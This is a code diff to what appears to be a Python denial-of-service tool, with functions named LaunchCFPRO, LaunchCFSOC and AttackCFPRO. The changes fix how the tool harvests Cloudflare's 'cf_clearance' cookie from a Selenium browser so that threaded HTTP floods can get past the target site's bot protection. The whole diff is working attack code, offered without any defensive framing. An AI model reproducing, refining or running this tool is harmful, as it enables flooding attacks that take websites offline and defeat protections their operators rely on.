@@ -237,6 +237,13 @@ def getcookie(url):
         cookies = driver.get_cookies()
         for i in cookies:
             if i['name'] == "cf_clearance":
+                cookieJAR = driver.get_cookies()[0]
+                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                if "cf_clearance" in cookie:
+                    pass
+                else:
+                    cookieJAR = driver.get_cookies()[1]
+                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                 driver.quit()
                 ii += 1
             else:
@@ -253,8 +260,6 @@ def LaunchCFPRO(url, th, t):
     for cookie in cookies:
         jar.set(cookie['name'], cookie['value'])
         scraper.cookies = jar
-    #stdout.write(jar)
-    print(jar)
     while threads_count <= int(th):
         try:
             thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
@@ -298,6 +303,11 @@ def LaunchCFSOC(url, th, t):
                 cookieJAR = driver.get_cookies()[0]
                 useragent = driver.execute_script("return navigator.userAgent")
                 cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                if "cf_clearance" in cookie:
+                        pass
+                else:
+                    cookieJAR = driver.get_cookies()[1]
+                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                 driver.quit()
                 ii += 1
             else:
